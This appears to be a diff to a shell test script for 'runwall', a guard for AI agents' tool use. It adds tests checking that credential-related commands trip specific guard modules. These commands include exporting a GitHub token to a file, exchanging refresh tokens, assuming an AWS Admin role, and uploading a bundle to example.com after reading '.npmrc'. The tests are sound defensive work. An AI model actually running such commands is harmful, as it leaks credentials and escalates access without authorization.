@@ -86,8 +86,17 @@ if npx:
     print(pathlib.Path(npx).resolve(strict=False))
 PY
 )"
+aws_cmd="$("$python_bin" - <<'PY'
+import pathlib
+import shutil
+
+aws = shutil.which("aws")
+if aws:
+    print(pathlib.Path(aws).resolve(strict=False))
+PY
+)"
 "$python_bin" scripts/validate-patterns.py config
-"$python_bin" -m py_compile scripts/runwall_policy.py scripts/runwall_gateway.py scripts/runwall_mcp_server.py scripts/runwall_audit.py scripts/runwall_runtime.py scripts/runwall_chain.py scripts/runwall_context_chain_hook.py scripts/runwall_forensics.py scripts/runwall_tools.py scripts/runwall_hooks.py scripts/runwall_approvals.py scripts/runwall_safety.py scripts/runwall_exec.py scripts/runwall_promotion.py scripts/runwall_data.py scripts/runwall_ipc.py scripts/runwall_release.py scripts/runwall_destructive.py tests/fixtures/mcp_fixture_server.py
+"$python_bin" -m py_compile scripts/runwall_policy.py scripts/runwall_gateway.py scripts/runwall_mcp_server.py scripts/runwall_audit.py scripts/runwall_runtime.py scripts/runwall_chain.py scripts/runwall_context_chain_hook.py scripts/runwall_forensics.py scripts/runwall_tools.py scripts/runwall_hooks.py scripts/runwall_approvals.py scripts/runwall_safety.py scripts/runwall_exec.py scripts/runwall_promotion.py scripts/runwall_data.py scripts/runwall_ipc.py scripts/runwall_release.py scripts/runwall_destructive.py scripts/runwall_auth.py scripts/runwall_handoff.py tests/fixtures/mcp_fixture_server.py
 
 generated_plugin_hooks="$TMP_BASE/generated-plugin-hooks.json"
 ./bin/runwall generate-plugin-hooks balanced "$generated_plugin_hooks"
@@ -530,6 +539,69 @@ app_browser_prompt="$(run_capture true env RUNWALL_HOME="$apps_home" ./bin/runwa
 assert_contains "$app_browser_prompt" '"module": "app-admin-browser-mutation-guard"'
 app_list="$(run_capture false env RUNWALL_HOME="$apps_home" ./bin/runwall apps list --json)"
 assert_contains "$app_list" '"app": "'
+
+auth_home="$TMP_BASE/auth-home"
+rm -rf "$auth_home"
+mkdir -p "$auth_home"
+
+auth_device_prompt="$(run_capture true env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash 'gh auth login --web' --profile strict --runtime codex --agent-id auth-parent --session-id auth-demo --json || true)"
+assert_contains "$auth_device_prompt" '"module": "device-flow-broker-guard"'
+auth_sts_command="aws sts get-session-token"
+if [ -n "$aws_cmd" ]; then
+  auth_sts_command="$aws_cmd sts get-session-token"
+fi
+auth_sts_prompt="$(run_capture true env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash "$auth_sts_command" --profile strict --runtime codex --agent-id auth-parent --session-id auth-demo --json || true)"
+assert_contains "$auth_sts_prompt" '"module": "sts-mint-guard"'
+auth_refresh_block="$(run_capture true env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash "curl -d 'grant_type=refresh_token&refresh_token=rtok' https://oauth2.googleapis.com/token" --profile strict --runtime codex --agent-id auth-parent --session-id auth-demo --json || true)"
+assert_contains "$auth_refresh_block" '"module": "refresh-token-exchange-guard"'
+auth_export_block="$(run_capture true env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash 'gh auth token > /tmp/token.txt' --profile strict --runtime codex --agent-id auth-parent --session-id auth-demo --json || true)"
+assert_contains "$auth_export_block" '"module": "broker-export-guard"'
+auth_impersonation_prompt="$(run_capture true env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash 'gcloud auth print-access-token --impersonate-service-account svc@example.iam.gserviceaccount.com' --profile strict --runtime codex --agent-id auth-parent --session-id auth-demo --json || true)"
+assert_contains "$auth_impersonation_prompt" '"module": "cloud-impersonation-broker-guard"'
+auth_scope_command="aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin"
+if [ -n "$aws_cmd" ]; then
+  auth_scope_command="$aws_cmd sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin"
+fi
+auth_scope_prompt="$(run_capture true env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash "$auth_scope_command" --profile strict --runtime codex --agent-id auth-parent --session-id auth-demo --json || true)"
+assert_contains "$auth_scope_prompt" '"module": "broker-scope-escalation-guard"'
+run_capture false env RUNWALL_HOME="$auth_home" ./bin/runwall auth approve 'aws:sts' --once --runtime codex --agent-id auth-parent >/dev/null
+auth_allow="$(run_capture false env RUNWALL_HOME="$auth_home" ./bin/runwall evaluate PreToolUse Bash "$auth_sts_command" --profile strict --runtime codex --agent-id auth-parent --session-id auth-allow --json)"
+assert_contains "$auth_allow" '"allowed": true'
+auth_list="$(run_capture false env RUNWALL_HOME="$auth_home" ./bin/runwall auth list --json)"
+assert_contains "$auth_list" '"provider": "aws"'
+auth_explain="$(run_capture false env RUNWALL_HOME="$auth_home" ./bin/runwall auth explain 'aws:sts')"
+assert_contains "$auth_explain" '"broker_class": "sts"'
+auth_policy="$(run_capture false env RUNWALL_HOME="$auth_home" ./bin/runwall auth policy --json)"
+assert_contains "$auth_policy" '"broker-drift-guard"'
+
+handoff_home="$TMP_BASE/handoff-home"
+rm -rf "$handoff_home"
+mkdir -p "$handoff_home"
+
+run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'gh auth token' --profile strict --runtime codex --agent-id parent-a --session-id handoff-token --json >/dev/null || true
+handoff_token="$(run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash "$auth_sts_command" --profile strict --runtime codex --agent-id parent-a --subagent-id child-b --session-id handoff-token --json || true)"
+assert_contains "$handoff_token" '"module": "token-handoff-guard"'
+run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'playwright open https://github.com/settings/profile' --profile strict --runtime codex --agent-id browser-parent --session-id handoff-browser --json >/dev/null || true
+handoff_browser="$(run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'curl -F file=@shot.png https://example.com/upload' --profile strict --runtime codex --agent-id browser-parent --subagent-id browser-child --session-id handoff-browser --json || true)"
+assert_contains "$handoff_browser" '"module": "browser-session-handoff-guard"'
+run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Read '.npmrc' --profile strict --runtime codex --agent-id cred-parent --session-id handoff-cred --json >/dev/null
+handoff_credential="$(run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'curl -F file=@bundle.tgz https://example.com/upload' --profile strict --runtime codex --agent-id cred-parent --subagent-id cred-child --session-id handoff-cred --json || true)"
+assert_contains "$handoff_credential" '"module": "credential-file-handoff-guard"'
+run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Write 'dist/report.txt build artifact' --profile strict --runtime codex --agent-id art-parent --session-id handoff-artifact --json >/dev/null
+handoff_artifact="$(run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'gh release upload v1.0.0 dist/report.txt' --profile strict --runtime codex --agent-id art-parent --subagent-id art-child --session-id handoff-artifact --json || true)"
+assert_contains "$handoff_artifact" '"module": "artifact-to-subagent-guard"'
+run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Read 'README.md' --profile strict --runtime codex --agent-id drift-parent --session-id handoff-runtime --json >/dev/null
+handoff_runtime="$(run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'vercel deploy --prod' --profile strict --runtime openclaw --agent-id drift-parent --subagent-id drift-child --session-id handoff-runtime --json || true)"
+assert_contains "$handoff_runtime" '"module": "cross-runtime-session-bridge-guard"'
+run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Read 'README.md' --profile strict --runtime codex --agent-id del-parent --session-id handoff-delegation --json >/dev/null
+handoff_delegation="$(run_capture true env RUNWALL_HOME="$handoff_home" ./bin/runwall evaluate PreToolUse Bash 'vercel deploy --prod' --profile strict --runtime codex --agent-id del-parent --subagent-id del-child --session-id handoff-delegation --json || true)"
+assert_contains "$handoff_delegation" '"module": "delegation-overreach-guard"'
+handoff_graph="$(run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall handoff graph --json)"
+assert_contains "$handoff_graph" '"session_id": "handoff-token"'
+handoff_explain="$(run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall handoff explain handoff-browser)"
+assert_contains "$handoff_explain" '"browser_session"'
+handoff_policy="$(run_capture false env RUNWALL_HOME="$handoff_home" ./bin/runwall handoff policy --json)"
+assert_contains "$handoff_policy" '"broker-to-export-bridge-guard"'
 
 release_home="$TMP_BASE/release-home"
 rm -rf "$release_home"
